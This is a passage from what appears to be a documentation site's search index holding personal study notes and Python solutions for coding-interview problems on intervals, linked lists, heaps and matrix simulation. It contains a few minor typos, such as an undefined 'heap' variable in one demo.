Intervals","text":"<pre><code>class Solution:\n    def merge(self, intervals: List[List[int]]) -&gt; List[List[int]]:\n        # sort based on the first index first\n        res = []\n        if not intervals:\n            return []\n\n        intervals.sort()\n        res.append(intervals[0])\n        for i in range(1, len(intervals)):\n            if intervals[i][0] &lt;= res[-1][1]:\n                res[-1][1] = max(res[-1][1], intervals[i][1])\n            else:\n                res.append(intervals[i])\n\n        return res\n</code></pre>"},{"location":"Algorithms/Intervals/#meeting-rooms","title":"Meeting Rooms","text":"<pre><code>class Solution:\n    def canAttendMeetings(self, intervals: List[Interval]) -&gt; bool:\n        intervals.sort(key = lambda i:i.start)\n        for i in range(1, len(intervals)):\n            if intervals[i].start &gt;= intervals[i - 1].end:\n                continue\n            else:\n                return False\n        return True\n</code></pre>"},{"location":"Algorithms/Intervals/#meeting-rooms-ii","title":"Meeting Rooms II","text":"<p>The core is we sort the given intervals first based on the start time then we loop each interval, compare the start time if is greater than the minimum end times in the heap. The reason to use a heap is that we could encounter several same start time but different end times, so we want to maintain the end time of each meeting room.</p> <pre><code>class Solution:\n    def minMeetingRooms(self, intervals: List[Interval]) -&gt; int:\n        intervals.sort(key=lambda x: x.start)\n        min_heap = []\n\n        for interval in intervals:\n            if min_heap and min_heap[0] &lt;= interval.start:\n                heapq.heappop(min_heap)\n            heapq.heappush(min_heap, interval.end)\n\n        return len(min_heap)\n</code></pre>"},{"location":"Algorithms/Linked%20List/","title":"Linked List","text":""},{"location":"Algorithms/Linked%20List/#reverse-linked-list","title":"Reverse Linked List","text":"<p>Main idea is about switching the direction between 2 nodes by using 2 variables, similar to the swapping algorithm, keep a variable of the next one and switching the prev and curr places, then finally reassigning.</p> <p></p> <pre><code>class Solution:\n    def reverseList(self, head: Optional[ListNode]) -&gt; Optional[ListNode]:\n        prev, curr = None, head\n\n        while curr:\n            nxt = curr.next\n            curr.next = prev\n            prev = curr\n            curr = nxt\n\n        return prev\n</code></pre>"},{"location":"Algorithms/Linked%20List/#merge-two-sorted-linked-lists","title":"Merge Two Sorted Linked Lists","text":"<p>Notice that linked list is stored in memory, so reassigning the order wouldn't need extra space, get confused for the in-place changing at first.</p> <pre><code>class Solution:\n    def mergeTwoLists(self, list1: Optional[ListNode], list2: Optional[ListNode]) -&gt; Optional[ListNode]:\n        dummy = tail = ListNode()\n        while list1 and list2:\n            if list2.val &lt;= list1.val:\n                tail.next = list2\n                list2 = list2.next\n            else:\n                tail.next = list1\n                list1 = list1.next\n            tail = tail.next\n\n        if list1:\n            tail.next = list1\n        elif list2:\n            tail.next = list2\n\n        return dummy.next\n</code></pre>"},{"location":"Algorithms/Linked%20List/#linked-list-cycle-detection","title":"Linked List Cycle Detection","text":"<p>A good way to remember is that start at the same position, and fast pointer moves by 2. So we want to check that fast and fast.next if it's null, cuz it would throw an error if we indexing the null since we are incrementing the fast pointer by 2 then we can compare with the slow and fast.</p> <pre><code>class Solution:\n    def hasCycle(self, head: Optional[ListNode]) -&gt; bool:\n        # 2 pointers, a cycle would never reach the end\n        slow, fast = head, head\n\n        while fast and fast.next:\n            slow = slow.next\n            fast = fast.next.next\n            if slow == fast:\n                return True\n\n        return False\n</code></pre>"},{"location":"Algorithms/Linked%20List/#reorder-linked-list","title":"Reorder Linked List","text":"<p>We can find that is about moving the left and right pointer, the issue is that for linked list we can't easily get the prev list, we can solve this by reversing the second half then using the 2 pointers.</p> <p></p> <p>An efficient way to find the mid position is to use a slow and fast pointer.</p> <p></p> <p>https://leetcode.com/problems/middle-of-the-linked-list/</p> <pre><code>class Solution:\n    def middleNode(self, head: Optional[ListNode]) -&gt; Optional[ListNode]:\n        slow, fast = head, head\n\n        while fast and fast.next:\n            slow = slow.next\n            fast = fast.next.next\n\n        return slow\n</code></pre> <p></p> <p>Notice that how we use slow.next = None to break the linked list into half.</p> <pre><code># Definition for singly-linked list.\n# class ListNode:\n#     def __init__(self, val=0, next=None):\n#         self.val = val\n#         self.next = next\n\nclass Solution:\n    def reorderList(self, head: Optional[ListNode]) -&gt; None:\n        slow, fast = head, head\n\n        while fast and fast.next:\n            slow = slow.next\n            fast = fast.next.next\n\n        prev, curr = None, slow.next # curr now holds a reference to the node *after* slow\n        slow.next = None # breaks the first half of the list by setting slow.next to None\n        #reverse the linked list\n        while curr:\n            nxt = curr.next\n            curr.next = prev\n            prev = curr\n            curr = nxt\n\n        first, second = head, prev\n        while second:\n            tmp1, tmp2 = first.next, second.next\n            first.next = second\n            second.next = tmp1\n            first, second = tmp1, tmp2\n</code></pre>"},{"location":"Algorithms/Linked%20List/#remove-node-from-end-of-linked-list","title":"Remove Node From End of Linked List","text":"<pre><code>class Solution:\n    def removeNthFromEnd(self, head: Optional[ListNode], n: int) -&gt; Optional[ListNode]:\n        # two pointers with n incrementing space to know the end\n        # dummy = head\n        dummy = slow = ListNode(next = head)\n        fast = head\n        for _ in range(n):\n            fast = fast.next\n\n        while fast:\n            slow = slow.next\n            fast = fast.next\n\n        # remove = slow.next\n        # slow.next = remove.next\n        slow.next = slow.next.next # another way to delete\n\n        return dummy.next\n</code></pre>"},{"location":"Algorithms/Linked%20List/#copy-linked-list-with-random-pointer","title":"Copy Linked List with Random Pointer","text":"<p>Core idea is that we want to construct a hashmap that stores each node as the key, and also create a corresponding newNode for each node. So that on the next iteration we can connect the hashmap value based on the current node.</p> <pre><code>class Solution:\n    def copyRandomList(self, head: 'Optional[Node]') -&gt; 'Optional[Node]':\n        if head is None:\n            return None\n\n        tail = head\n        table = {None: None} # key: node, value: newNode\n\n        while tail:\n            table[tail] = Node(tail.val)\n            tail = tail.next\n        tail = head\n\n        while tail:\n            table[tail].next = table[tail.next]\n            table[tail].random = table[tail.random]\n            tail = tail.next\n\n        return table[head]\n</code></pre> <p>We can also optimize this to O(1) auxiliary space.</p> <p>Step1:</p> <p></p> <p>Step2:</p> <p></p> <p>Step3:</p> <p></p> <pre><code>class Solution:\n    def copyRandomList(self, head: 'Optional[Node]') -&gt; 'Optional[Node]':\n        if not head:\n            return None\n\n        node = head\n        while node:\n            nxt = node.next\n            node.next = Node(node.val) # Create a clone\n            node.next.next = nxt\n            node = nxt\n\n        # Assign the random\n        node = head\n        while node:\n            random_node = node.random\n            if random_node:\n                node.next.random = random_node.next\n            node = node.next.next\n\n        # Now reconstructing the original list and also store the new list\n        node = head\n        copy_node = clone = head.next\n        while node:\n            node.next = node.next.next\n            clone.next = (clone.next.next if clone.next else None)\n            node = node.next\n            clone = clone.next\n\n        return copy_node\n</code></pre>"},{"location":"Algorithms/Linked%20List/#add-two-numbers","title":"Add Two Numbers","text":"<p>Not too many tricks, just be careful to handle the length and carry.</p> <pre><code>class Solution:\n    def addTwoNumbers(self, l1: Optional[ListNode], l2: Optional[ListNode]) -&gt; Optional[ListNode]:\n        dummy = ListNode()\n        cur = dummy\n\n        carry = 0\n        while l1 or l2 or carry:\n            v1 = l1.val if l1 else 0\n            v2 = l2.val if l2 else 0\n\n            # new digit\n            val = v1 + v2 + carry\n            carry = val // 10\n            val = val % 10\n            cur.next = ListNode(val)\n\n            # update ptrs\n            cur = cur.next\n            l1 = l1.next if l1 else None\n            l2 = l2.next if l2 else None\n\n        return dummy.next\n</code></pre>"},{"location":"Algorithms/Linked%20List/#find-the-duplicate-number-floyds-cycle-detection","title":"Find the Duplicate Number - Floyd's Cycle Detection","text":"<p>1) Linked List Cycle 2) Floyd's</p> <p>2 iterations: </p> <p>1st first find the start and slow pointer</p> <p></p> <p>2nd slow2 start at the beginning, once the slow and slow2 reach, it means the duplicate is found.</p> <p></p> <pre><code>class Solution:\n    def findDuplicate(self, nums: List[int]) -&gt; int:\n        slow, fast = 0, 0\n        while True:\n            slow = nums[slow]\n            fast = nums[nums[fast]]\n            if slow == fast:\n                break\n\n        slow2 = 0\n        while True:\n            slow = nums[slow]\n            slow2 = nums[slow2]\n            if slow == slow2:\n                return slow\n</code></pre> <p>https://www.geeksforgeeks.org/floyds-cycle-finding-algorithm/</p> <p>Find the Starting Node of a Cycle in a Linked List</p> <p>To find the starting node of a cycle in a linked list, follow the steps below:</p> <ul> <li>Using above algorithm we can find the *meeting point (if cycle exists)* where the slow and fast pointers *intersect* inside the cycle.</li> <li>After detecting the cycle, reset one pointer *(slow)* to the *head* of the list. Keep the other pointer *(fast)* at the meeting point.</li> <li>Move both pointers *one s*tep at a time. The node where they meet again is the *start* of the cycle.</li> </ul>"},{"location":"Algorithms/Linked%20List/#lru-cache","title":"LRU cache","text":"<p>Doubly Linked List, practice, practice and practice ...</p> <pre><code>class Node:\n    def __init__(self, key=0, val=0, prev=None, next=None):\n        self.key = key\n        self.val = val\n        self.prev = prev\n        self.next = next\n\nclass LRUCache:\n\n    def __init__(self, capacity: int):\n        self.capacity = capacity\n        self.cache = {}  # key: int -&gt; Node\n        self.start = Node()  # dummy head\n        self.tail = Node()   # dummy tail\n        self.start.next = self.tail\n        self.tail.prev = self.start\n\n    def get(self, key: int) -&gt; int:\n        if key in self.cache:\n            node = self.cache[key]\n            self._remove_node(node)\n            self._add_node(node)\n            return node.val\n        return -1\n\n    def put(self, key: int, value: int) -&gt; None:\n        if key in self.cache:\n            node = self.cache[key]\n            node.val = value\n            self._remove_node(node)\n            self._add_node(node)\n        else:\n            if len(self.cache) &gt;= self.capacity:\n                lru = self.tail.prev\n                self._remove_node(lru)\n                del self.cache[lru.key]\n            new_node = Node(key, value)\n            self._add_node(new_node)\n            self.cache[key] = new_node\n\n    def _add_node(self, node):\n        # Always add to the front (right after dummy head)\n        node.prev = self.start\n        node.next = self.start.next\n        self.start.next.prev = node\n        self.start.next = node\n\n    def _remove_node(self, node):\n        # Detach from its neighbors\n        prev = node.prev\n        nxt = node.next\n        prev.next = nxt\n        nxt.prev = prev\n</code></pre>"},{"location":"Algorithms/Linked%20List/#merge-k-sorted-linked-lists","title":"Merge K Sorted Linked Lists","text":"<p>The core idea is we can separate this question from merge multiple linked lists to merge 2 linked lists per time and it will eventually result into a single list.  Time: O(n logk), Space(k), k is the length of the input lists</p> <p></p> <pre><code>class Solution:    \n    def mergeKLists(self, lists: List[Optional[ListNode]]) -&gt; Optional[ListNode]:\n        # split the lists into 2 and merge every time and eventually it will converge to 1\n\n        if not lists:\n            return None\n\n        while len(lists) &gt; 1:\n            merged_lists = []\n            for i in range(0, len(lists), 2): # merge 2 lists each time\n                l1 = lists[i]\n                l2 = lists[i + 1] if i + 1 &lt; len(lists) else None # may out of bounds\n                merged_lists.append(self.mergeLists(l1, l2))\n            lists = merged_lists\n\n        return lists[0]\n\n    def mergeLists(self, l1, l2):\n        # Merge 2 lists and return the megered list\n        dummy = tail = ListNode()\n        while l1 and l2:\n            if l1.val &lt; l2.val:\n                tail.next = l1\n                l1 = l1.next\n            else:\n                tail.next = l2\n                l2 = l2.next\n            tail = tail.next\n        if l1:\n            tail.next = l1\n        if l2:\n            tail.next = l2\n        return dummy.next\n</code></pre>"},{"location":"Algorithms/Linked%20List/#reverse-nodes-in-k-group","title":"Reverse Nodes in K-Group","text":"<p>The main idea is that we can split this question into the version of reverse linked list by comparing the end node after k steps. But we need to be very careful on relinking the reverse nodes.</p> <p></p> <pre><code># Definition for singly-linked list.\n# class ListNode:\n#     def __init__(self, val=0, next=None):\n#         self.val = val\n#         self.next = next\n\nclass Solution:\n    def reverseKGroup(self, head: Optional[ListNode], k: int) -&gt; Optional[ListNode]:\n        if not head:\n            return None\n\n        start = dummy = ListNode(next = head)\n\n        while True:\n            end_k = self.getReversePos(k, start)\n\n            if not end_k:\n                break\n            groupNext = end_k.next\n\n            prev, curr = end_k.next, start.next\n            # reverse linked lists\n            while curr != groupNext:\n                nxt = curr.next\n                curr.next = prev\n                prev = curr\n                curr = nxt\n            # complicated -&gt;\n            tmp = start.next # first node\n            start.next = end_k # the kth reverse node position\n            start = tmp # now the first node is pointing to the remaining linked list, we can use this as our start\n        return dummy.next\n\n    def getReversePos(self, k, l):\n        while l and k &gt; 0:\n            l = l.next\n            k -= 1\n        return l\n</code></pre>"},{"location":"Algorithms/Linked%20List/#summary","title":"Summary","text":"<p>After working through these linked list problems, several recurring techniques emerge, each with specific scenarios where they are most effective:</p>"},{"location":"Algorithms/Linked%20List/#two-pointers-slowfast","title":"\ud83d\udfe9 Two Pointers (Slow/Fast)","text":"<ul> <li>Finding the Middle Node    \u2192 Use slow and fast pointers. Fast moves 2 steps, slow moves 1. When fast reaches the end, slow is at the middle.    \u2937 <code>middleNode</code>, <code>reorderList</code></li> <li>Cycle Detection    \u2192 Use the same pattern. If a cycle exists, slow and fast will eventually meet.    \u2937 <code>hasCycle</code>, <code>findDuplicate</code> (array-based cycle)</li> <li>Finding Cycle Start Point    \u2192 After detecting a cycle, reset one pointer to head and move both 1 step at a time. Their meeting point is the start of the cycle.    \u2937 <code>findDuplicate</code> (Floyd's Tortoise &amp; Hare)</li> <li>Finding K-th Node from End    \u2192 Move <code>fast</code> pointer <code>n</code> steps ahead, then move both <code>slow</code> and <code>fast</code> together. When <code>fast</code> reaches the end, <code>slow</code> is at the target.    \u2937 <code>removeNthFromEnd</code></li> </ul>"},{"location":"Algorithms/Linked%20List/#reversing-a-linked-list","title":"\ud83d\udfe8 Reversing a Linked List","text":"<ul> <li>Full List Reverse    \u2192 Use <code>prev</code>, <code>curr</code>, and <code>nxt</code> to reverse pointers.    \u2937 <code>reverseList</code></li> <li>Reverse Partial (e.g., K-group)    \u2192 Apply the same logic within a group. First validate group size using pointer traversal, then reverse in-place.    \u2937 <code>reverseKGroup</code></li> <li>Helper for Complex Operations    \u2192 Used in problems like <code>reorderList</code> to reverse the second half before merging.</li> </ul>"},{"location":"Algorithms/Linked%20List/#dummy-node","title":"\ud83d\udfe6 Dummy Node","text":"<ul> <li>Simplify Insert/Delete Operations    \u2192 Always use a dummy head when dealing with potential edge cases (e.g., inserting at head or removing head node).    \u2937 <code>mergeTwoLists</code>, <code>removeNthFromEnd</code>, <code>addTwoNumbers</code>, <code>mergeKLists</code></li> </ul>"},{"location":"Algorithms/Linked%20List/#hash-map","title":"\ud83d\udfe7 Hash Map","text":"<ul> <li>Track Correspondence Between Original and Copied Nodes    \u2192 Use when each node has more than just <code>.next</code> (e.g., random pointer).    \u2937 <code>copyRandomList</code> (O(n) space solution)</li> </ul>"},{"location":"Algorithms/Linked%20List/#priority-queue-divide-and-conquer","title":"\ud83d\udfe5 Priority Queue / Divide and Conquer","text":"<ul> <li>Merging K Sorted Lists    \u2192 Use min-heap for O(N log K) or pairwise divide-and-conquer merges.    \u2937 <code>mergeKLists</code></li> </ul>"},{"location":"Algorithms/Linked%20List/#doubly-linked-list-hashmap","title":"\ud83d\udfe8 Doubly Linked List + HashMap","text":"<ul> <li>LRU Cache    \u2192 Use a doubly linked list for ordering and hashmap for O(1) lookup and insert/remove.    \u2937 <code>LRUCache</code></li> </ul>"},{"location":"Algorithms/Linked%20List/#key-takeaways","title":"Key Takeaways","text":"<ul> <li>Linked List = Pointer Manipulation \u2192 Understand how to disconnect/reconnect nodes safely.</li> <li>Patterns are Reusable \u2192 Nearly every complex linked list problem is a variation of a basic pattern.</li> <li> <p>Space vs. Time Trade-offs \u2192 Know when to use extra space (e.g., HashMap) vs. clever pointer tricks (e.g., interleaving nodes in-place).</p> </li> <li> <p>ycle or locating duplicates when the input is constrained (e.g., values used as pointers).</p> </li> </ul>"},{"location":"Algorithms/Priority%20Queue%28Heap%29/","title":"Heap / Priority Queue","text":""},{"location":"Algorithms/Priority%20Queue%28Heap%29/#priority-queue-heap","title":"Priority Queue (Heap)","text":"<ul> <li>A heap is a binary tree where the parent node is smaller (<code>min-heap</code>) or larger (<code>max-heap</code>) than its children.</li> <li>Python\u2019s <code>heapq</code> implements a min-heap.</li> <li>For max-heap, insert negative values.</li> </ul>"},{"location":"Algorithms/Priority%20Queue%28Heap%29/#time-complexity","title":"\ud83e\uddee Time Complexity","text":"Operation Time Complexity <code>heappush()</code> O(log n) <code>heappop()</code> O(log n) <code>heapify()</code> O(n) <code>heapreplace()</code> O(log n) <code>nsmallest()</code> O(n log k)"},{"location":"Algorithms/Priority%20Queue%28Heap%29/#syntax","title":"Syntax","text":"<pre><code>import heapq\n\n# Min-Heap, by default Python using min heap\nmin_heap = []\nfor num in [3, 1, 5]:\n    heapq.heappush(min_heap, num)\nprint(\"Top of Min-Heap:\", heap[0])  # \u2192 1\nprint(\"Min-Heap pop:\", heapq.heappop(min_heap))  # \u2192 1\n\n# Max-Heap using negation\nmax_heap = []\nfor num in [3, 1, 5]:\n    heapq.heappush(max_heap, -num)\nprint(\"Top of Max-Heap:\", -max_heap[0])  # \u2192 5\nprint(\"Max-Heap pop:\", -heapq.heappop(max_heap))  # \u2192 5, notice the minus sign\n\n# Heapify a list\narr = [4, 2, 7, 1]\nheapq.heapify(arr)\nprint(\"Heapified array:\", arr)  # \u2192 [1, 2, 7, 4] or similar heap order\n</code></pre>"},{"location":"Algorithms/Priority%20Queue%28Heap%29/#find-median-from-data-stream","title":"Find Median From Data Stream","text":"<pre><code>class MedianFinder:\n\n    def __init__(self):\n        # two heaps, heap should have equal size\n        # 3 2 7 4\n        # rebalance the heap, every elements in small heap &lt; large_heap[0]\n        self.small_heap = [] # max heap, default\n        self.large_heap = [] # min heap\n\n    def addNum(self, num: int) -&gt; None:\n        # when the length of the two heap difference &gt; 1, rebalance the heap\n        # check where to add\n        # rebalance based on the 2 heap lengths\n        if not self.small_heap:\n            heapq.heappush(self.small_heap, -num)\n        elif num &gt; -self.small_heap[0]:\n            heapq.heappush(self.large_heap, num)\n            # balance\n            if len(self.large_heap) - len(self.small_heap) &gt; 1:\n                val = heapq.heappop(self.large_heap)\n                heapq.heappush(self.small_heap, -val)\n        else:\n            heapq.heappush(self.small_heap, -num)\n            if len(self.small_heap) - len(self.large_heap) &gt; 1:\n                val = -heapq.heappop(self.small_heap)\n                heapq.heappush(self.large_heap, val)\n\n    def findMedian(self) -&gt; float:\n        # check the length\n        if len(self.small_heap) == len(self.large_heap):\n            res = (-self.small_heap[0] + self.large_heap[0]) / 2\n            return res\n        elif len(self.small_heap) &gt; len(self.large_heap):\n            return -self.small_heap[0]\n        else:\n            return self.large_heap[0]\n</code></pre>"},{"location":"Algorithms/Priority%20Queue%28Heap%29/#task-scheduler","title":"Task Scheduler","text":"<pre><code>class Solution:\n    def leastInterval(self, tasks: List[str], n: int) -&gt; int:\n        count = Counter(tasks)\n        maxHeap = [-cnt for cnt in count.values()]\n        heapq.heapify(maxHeap)\n\n        time = 0\n        q = deque()  # pairs of [-cnt, idleTime]\n        while maxHeap or q:\n            time += 1\n\n            if not maxHeap:\n                time = q[0][1]\n            else:\n                cnt = 1 + heapq.heappop(maxHeap)\n                if cnt:\n                    q.append([cnt, time + n])\n            if q and q[0][1] == time:\n                heapq.heappush(maxHeap, q.popleft()[0])\n        return time\n</code></pre>"},{"location":"Algorithms/Simulation/","title":"CodeSignal","text":"<p>Understand the question type through this general-coding-assessment-framework.pdf.</p> <p>Recommend question order, Q1 -&gt; Q2 &gt; Q3 (look through the question) -&gt; Q4 (brute force if not able to come up an optimal solution) -&gt; Q3(finish) -&gt; Q4(optimize)</p>"},{"location":"Algorithms/Simulation/#q1-q2","title":"Q1 &amp; Q2","text":"<p>For q1, straightforward, understand common used array and string manipulation methods. (5 - 10 lines of code)</p> <p>For  q2, The question can be long, take time to understand the question and solve use the brute force way. (10 - 20 lines of code)</p> <pre><code># 2. String Indexing and Slicing\ns = \"AdvancedPython\"\nprint(s[0])    # First character: 'A'\nprint(s[-1])   # Last character: 'n'\nprint(s[2:8])  # Substring from index 2 to 7: 'vanced'\nprint(s[:7])   # From beginning to index 6: 'Advance'\nprint(s[::2])  # Every 2nd character: 'Aaceyh'\nprint(s[::-1]) # Reverse the string\n</code></pre> <pre><code># 3. Common String Methods\ntext = \"  Hello, Python World!  \"\nprint(text.strip())      # Remove leading and trailing whitespace\nprint(text.lower())      # Convert to lowercase\nprint(text.upper())      # Convert to uppercase\nprint(text.title())      # Capitalize each word\nprint(text.replace(\"Python\", \"C#\"))  # Replace substring\nprint(text.find(\"Python\"))           # Find index of substring (-1 if not found)\nprint(text.startswith(\"  Hello\"))    # Check if starts with\nprint(text.endswith(\"World!  \"))     # Check if ends with\nprint(\"123abc\".isalnum())            # Check alphanumeric\nprint(\"123\".isdigit())               # Check digits only\nprint(\"abc\".isalpha())               # Check alphabetic only\n</code></pre> <pre><code># 4. Joining and Splitting\nwords = [\"Python\", \"is\", \"awesome\"]\nsentence = \" \".join(words)    # Join list into a string with spaces\nprint(sentence)              # Output: Python is awesome\nsplit_words = sentence.split(\" \")  # Split string back into list\nprint(split_words)\n\nlength = [3, 5, 7]\nsentence = \"#\".join(length)  # \u274c TypeError: expected str, got int, join would always the iterable elements string\nlength = [3, 5, 7]\nsentence = \"#\".join(map(str, length))  # \u2705 \"3#5#7\"\nsentence = \"#\".join([str(x) for x in length]) #Alternatively:\nprint(sentence)  # Output: 3#5#7\n\ncsv = \"3#5#7\"\nsplit_numbers = csv.split(\"#\") # Split a string using custom delimiter\nprint(split_numbers)  # Output: ['3', '5', '7']\n</code></pre>"},{"location":"Algorithms/Simulation/#q3-simulation","title":"Q3 - Simulation","text":"<p>25 - 40 lines of code, aim to solve in 15 - 20 minutes</p>"},{"location":"Algorithms/Simulation/#54-spiral-matrix","title":"54. Spiral Matrix","text":"<pre><code>class Solution:\n    def spiralOrder(self, matrix: List[List[int]]) -&gt; List[int]:\n        #spiral order, from outer circle to inner circle\n        #simulate boundary, use smth to record index\n        res = []\n        top,bottom = 0, len(matrix)-1\n        left,right = 0, len(matrix[0])-1\n        order_state = \"right\"\n        while len(res) &lt; (len(matrix) * len(matrix[0])):\n            if order_state == \"right\":\n                for i in range(left, right+1): # 123\n                    res.append(matrix[top][i])\n                order_state = \"bottom\"\n                top += 1\n            elif order_state == \"bottom\": # 69\n                for j in range(top, bottom+1):\n                    res.append(matrix[j][right])\n                order_state = \"left\"\n                right-=1\n            elif order_state == \"left\":\n                for i in range(right,left-1, -1): #8 7\n                    res.append(matrix[bottom][i])\n                order_state = \"up\"\n                bottom -= 1\n            elif order_state == \"up\":\n                # print(bottom,top,left)\n                for j in range(bottom, top-1, -1): # 4\n                    res.append(matrix[j][left])\n                order_state = \"right\"\n                #increment the boundary\n                left += 1\n            # print(res)\n        return res\n</code></pre>"},{"location":"Algorithms/Simulation/#59-spiral-matrix-ii","title":"59. Spiral Matrix II","text":"<pre><code>class Solution:\n    def generateMatrix(self, n: int) -&gt; List[List[int]]:\n        #generate in spiral order\n\n        # define the boundary\n        res = [[0]*n for _ in range(n)]\n\n        # print(res)\n        left, right = 0, n\n        top, bottom = 0, n\n        count = 1\n        state = \"right\"\n        while count &lt;= (n*n):\n            if state == \"right\":\n                for i in range(left, right):\n                    res[top][i] = count\n                    count += 1\n                state = \"bottom\"\n                top += 1\n            elif state == \"bottom\":\n                for i in range(top, bottom):\n                    res[i][right-1] = count\n                    count += 1\n                right -= 1\n                state = \"left\"\n            elif state == \"left\":\n                for i in range(right-1, left-1,-1):\n                    res[bottom-1][i] = count\n                    count += 1\n                bottom -= 1\n                state = \"up\"\n            elif state == \"up\":\n                for i in range(bottom-1, top-1,-1):\n                    res[i][left] = count\n                    count += 1\n                left += 1\n                state = \"right\"\n            print(res)\n        return res\n</code></pre>"},{"location":"Algorithms/Simulation/#48-rotate-image","title":"* 48. Rotate Image","text":"<pre><code>class Solution:\n    def rotate(self, matrix: List[List[int]]) -&gt; None:\n        \"\"\"\n        Do not return anything, modify matrix in-place instead.\n        \"\"\"\n        #first transpose then mirror, also in place is hard\n        n = len(matrix)\n        def transpose(matrix):\n            for i in range(len(matrix)):\n                for j in range(i):\n                    matrix[i][j], matrix[j][i] = matrix[j][i], matrix[i][j]\n\n        transpose(matrix)\n        # print(matrix)\n        def mirror(matrix):\n            for i in range(n):\n                for j in range(n//2):\n                    matrix[i][j],matrix[i][n-j-1] = matrix[i][n-j-1], matrix[i][j]\n        mirror(matrix)\n</code></pre>"},{"location":"Algorithms/Simulation/#498-diagonal-traverse","title":"* 498. Diagonal Traverse","text":"<p>Got a similar one in the q3. Which request traverse 4 directions.</p> <pre><code>class Solution:\n    def findDiagonalOrder(self, mat: List[List[int]]) -&gt; List[int]:\n        # feel like just going through up and down ?\n        res = []\n        state = \"up\"\n        r, c = 0, 0\n        m = len(mat)\n        n = len(mat[0])\n        def isvalid(r, c):\n            if 0 &lt;= r &lt; m and 0 &lt;= c &lt; n:\n                return True\n            else:\n                return False\n        #change each state based on the valid condition\n        while len(res) &lt; (m *n):\n            if state == \"up\":\n                while isvalid(r, c):\n                    res.append(mat[r][c])\n                    r -= 1\n                    c += 1 \n                r += 1\n                c -= 1     \n                state = \"down\"\n                if c &lt; (n-1):\n                    c += 1\n                else:\n                    r += 1\n            elif state == \"down\":\n                while isvalid(r, c):\n                    res.append(mat[r][c])\n                    r += 1\n                    c -= 1\n                r -= 1\n                c += 1\n                state = \"up\"\n                if r &lt; (m-1):\n                    r += 1\n                else:\n                    c += 1\n            # print(res, r, c)\n        return res\n</code></pre>"},{"location":"Algorithms/Simulation/#566-reshape-the-matrix","title":"566. Reshape the Matrix","text":"<pre><code>class Solution:\n    def matrixReshape(self, mat: List[List[int]], r: int, c: int) -&gt; List[List[int]]:\n        #if legal\n        m = len(mat)\n        n = len(mat[0])\n        if not m *n == r *c: return mat\n\n        res = [[0] *c for _ in range(r)]\n\n        # print(res)\n        flat = []\n        for i in range(m):\n            for j in range(n):\n                flat.append(mat[i][j])\n\n        for i in range(len(flat)):\n            # 12\n            # if i:\n            row = i // c\n            col = i % c\n            res[row][col] = flat[i]\n            # print(res,row,col)\n            # else:\n            #     res[0][0] = flat[i]\n\n        return res\n</code></pre>"},{"location":"Algorithms/Simulation/#766-toeplitz-matrix","title":"766. Toeplitz Matrix","text":"<pre><code>class Solution:\n    def isToeplitzMatrix(self, matrix: List[List[int]]) -&gt; bool:\n        m, n = len(matrix), len(matrix[0])\n\n        for i in range(1, m):\n            for j in range(1, n):\n                if matrix[i][j] != matrix[i - 1][j - 1]:\n                    return False\n\n        return True\n</code></pre>"},{"location":"Algorithms/Simulation/#835-image-overlap","title":"835. Image Overlap","text":"<pre><code>from collections import defaultdict\nfrom typing import List\n\nclass Solution:\n    def largestOverlap(self, img1: List[List[int]], img2: List[List[int]]) -&gt; int:\n        n = len(img1)\n        ones1 = []\n        ones2 = []\n\n        # Step 1: Record positions of 1s\n        for i in range(n):\n            for j in range(n):\n                if img1[i][j] == 1:\n                    ones1.append((i, j))\n                if img2[i][j] == 1:\n                    ones2.append((i, j))\n\n        # Step 2: Count all translation vectors from img1 -&gt; img2\n        vector_count = defaultdict(int)\n        for x1, y1 in ones1:\n            for x2, y2 in ones2:\n                dx = x2 - x1\n                dy = y2 - y1\n                vector_count[(dx, dy)] += 1\n            print(vector_count)\n        # Step 3: Return the maximum overlap\n        return max(vector_count.values() or [0])\n</code></pre>"},{"location":"Algorithms/Simulation/#2373-largest-local-values-in-a-matrix","title":"2373. Largest Local Values in a Matrix","text":"<pre><code>class Solution:\n    def largestLocal(self, grid: List[List[int]]) -&gt; List[List[int]]:\n        n = len(grid)\n        maxLocal = [[0] * (n - 2) for _ in range(n - 2)]\n\n        for i in range(1, n - 1):\n            for j in range(1, n - 1):\n                tempMax = float('-inf')\n                # Traverse the 3x3 subgrid centered at (i, j)\n                for r in range(i - 1, i + 2):\n                    for c in range(j - 1, j + 2):\n                        tempMax = max(tempMax, grid[r][c])\n                maxLocal[i - 1][j - 1] = tempMax\n\n        return maxLocal\n</code></pre>"},{"location":"Algorithms/Simulation/#867-transpose-matrix","title":"867. Transpose Matrix","text":"<pre><code>class Solution:\n    def transpose(self, matrix: List[List[int]]) -&gt; List[List[int]]:\n\n        m, n = len(matrix), len(matrix[0])\n        trans = [[0] * m for _ in range(n)]\n\n        for i in range(m):\n            for j in range(n):\n                trans[j][i] = matrix[i][j]\n\n        return trans\n</code></pre>"},{"location":"Algorithms/Simulation/#68-text-justification-low-chance","title":"68. Text Justification - Low chance","text":"<pre><code>class Solution:\n    def fullJustify(self, words: List[str], maxWidth: int) -&gt; List[str]:\n        n = len(words)\n        word_arr = []\n        word_arr_len = []\n        curr_len = 0\n        temp = []\n        temp_len = []\n\n        for word in words:\n            word_len = len(word)\n            if word_len + curr_len + len(temp)-1 &lt; maxWidth:\n                temp.append(word)\n                temp_len.append(len(word))\n                curr_len += len(word)\n            else:\n                word_arr.append(temp)\n                word_arr_len.append(temp_len)\n                curr_len = len(word)\n                temp = [word]\n                temp_len = [len(word)]\n        word_arr.append(temp)\n        word_arr_len.append(temp_len)\n        #now justify the length, handle the last row separately\n        for i in range(len(word_arr)):\n            remain_space = maxWidth - sum(word_arr_len[i])\n            # print(remain_space)\n            empty_slot = len(word_arr[i]) - 1\n            if i != len(word_arr)-1 and empty_slot != 0:\n                for j in range(remain_space): # add space after equally\n                    insert_index = j % empty_slot\n                    word_arr[i][insert_index] += ' '\n            elif empty_slot == 0:\n                for _ in range(remain_space):\n                    word_arr[i][-1] += ' '\n\n            else:\n                for j in range(empty_slot):\n                    word_arr[i][j] += ' '\n\n                for _ in range(remain_space - empty_slot):\n                    word_arr[i][-1] += ' '\n        res = []\n        for i in range(len(word_arr)):\n            res.append(''.join(word_arr[i]))\n\n        print(word_arr, word_arr_len)\n        return res\n</code></pre>"},{"location":"Algorithms/Simulation/#q4-algorithm","title":"Q4 - Algorithm","text":"<p>20 - 35 lines of code.</p>"},{"location":"Algorithms/Simulation/#3160-find-the-number-of-distinct-colors-among-the-balls","title":"3160. Find the Number of Distinct Colors Among the Balls","text":"<pre><code>class Solution:\n    def queryResults(self, limit: int, queries: List[List[int]]) -&gt; List[int]:\n        